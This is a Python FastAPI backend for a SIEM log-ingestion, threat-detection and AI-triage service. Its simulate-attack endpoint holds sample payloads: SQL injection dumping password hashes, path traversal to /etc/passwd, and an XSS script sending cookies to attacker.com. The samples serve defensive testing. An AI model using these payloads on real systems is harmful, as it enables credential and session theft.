import os
import random
import sys
from typing import List, Optional
from fastapi import FastAPI, HTTPException, BackgroundTasks
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel

sys.path.append(os.path.dirname(__file__))

from database import (
    init_db, save_log, create_incident, get_incidents, 
    get_blocked_ips, get_dashboard_stats, update_incident_status, get_db
)
from detector import analyze_log
from ai_triage import generate_ai_triage
from playbooks import execute_remediation

app = FastAPI(
    title="SentinelX — Autonomous SIEM Log Engine & AI Threat Triage API",
    version="1.0.0",
    description="Enterprise-grade SIEM log collector, real-time threat detector, AI incident triage engine, and automated response platform."
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.on_event("startup")
def startup_event():
    init_db()

class LogIngestRequest(BaseModel):
    source_ip: str
    log_level: str = "INFO"
    service: str = "auth-service"
    message: str
    raw_payload: Optional[str] = ""

class AttackSimulateRequest(BaseModel):
    attack_type: str # sqli, brute_force, xss, path_traversal, ransomware

@app.get("/api/v1/health")
def health_check():
    return {"status": "ONLINE", "system": "SentinelX SIEM Engine v1.0.0"}

@app.get("/api/v1/stats")
def stats():
    return get_dashboard_stats()

@app.post("/api/v1/logs/ingest")
def ingest_log(req: LogIngestRequest):
    log_id = save_log(req.source_ip, req.log_level, req.service, req.message, req.raw_payload)
    
    # Run Detector Engine
    detection = analyze_log(req.source_ip, req.service, req.message, req.raw_payload)
    incident_id = None
    
    if detection:
        # Run AI Triage Engine
        ai_res = generate_ai_triage(
            title=detection["title"],
            category=detection["category"],
            severity=detection["severity"],
            source_ip=req.source_ip,
            raw_logs=detection["raw_logs"]
        )
        
        incident_id = create_incident(
            title=detection["title"],
            severity=detection["severity"],
            category=detection["category"],
            source_ip=req.source_ip,
            raw_logs=detection["raw_logs"],
            ai_summary=ai_res["ai_summary"],
            risk_score=ai_res["risk_score"],
            recommended_action=ai_res["recommended_action"]
        )
        
        # Auto-remediate CRITICAL threats
        if detection["severity"] == "CRITICAL":
            execute_remediation(incident_id, action_type="AUTO")

    return {
        "status": "ACCEPTED",
        "log_id": log_id,
        "threat_detected": bool(detection),
        "incident_id": incident_id
    }

@app.get("/api/v1/incidents")
def list_incidents(limit: int = 50):
    return get_incidents(limit=limit)

@app.post("/api/v1/incidents/{incident_id}/remediate")
def remediate_incident(incident_id: int):
    res = execute_remediation(incident_id, action_type="MANUAL")
    if not res["success"]:
        raise HTTPException(status_code=404, detail=res["message"])
    return res

@app.get("/api/v1/blocked-ips")
def blocked_ips():
    return get_blocked_ips()

@app.post("/api/v1/simulate-attack")
def simulate_attack(req: AttackSimulateRequest):
    attacks = {
        "sqli": {
            "source_ip": f"198.51.100.{random.randint(10, 200)}",
            "service": "payment-api",
            "message": "GET /api/v1/users?id=1' UNION SELECT username, password_hash FROM admin_users--",
            "raw_payload": "SELECT * FROM users WHERE id='1' UNION SELECT username, password_hash FROM admin_users--'"
        },
        "brute_force": {
            "source_ip": f"203.0.113.{random.randint(5, 150)}",
            "service": "auth-gateway",
            "message": "Authentication failure: invalid password for user 'admin'",
            "raw_payload": "POST /login user=admin pass=123456"
        },
        "xss": {
            "source_ip": f"192.0.2.{random.randint(15, 99)}",
            "service": "comments-service",
            "message": "POST /comment payload='<script>document.location=\"http://attacker.com/steal?cookie=\"+document.cookie</script>'",
            "raw_payload": "<script>onerror=alert(document.cookie)</script>"
        },
        "path_traversal": {
            "source_ip": f"198.51.100.{random.randint(201, 250)}",
            "service": "file-viewer",
            "message": "GET /download?file=../../../../etc/passwd",
            "raw_payload": "GET /download?file=../../../../etc/passwd HTTP/1.1"
        },
        "ransomware": {
            "source_ip": f"10.0.4.{random.randint(1, 50)}",
            "service": "storage-node-01",
            "message": "CRITICAL ALERT: Bulk file extension change detected. 450 files renamed to .locked_ransom",
            "raw_payload": "WIN_SYS_ENCRYPT_EVENT: key_hash=9942aef0"
        }
    }
    
    atk = attacks.get(req.attack_type, attacks["sqli"])
    
    # Ingest multiple logs if brute force to trigger threshold
    if req.attack_type == "brute_force":
        for _ in range(3):
            res = ingest_log(LogIngestRequest(**atk))
        return res
    else:
        return ingest_log(LogIngestRequest(**atk))

# Serve static frontend files
FRONTEND_DIR = os.path.join(os.path.dirname(os.path.dirname(__file__)), "frontend")
if os.path.exists(FRONTEND_DIR):
    app.mount("/", StaticFiles(directory=FRONTEND_DIR, html=True), name="frontend")
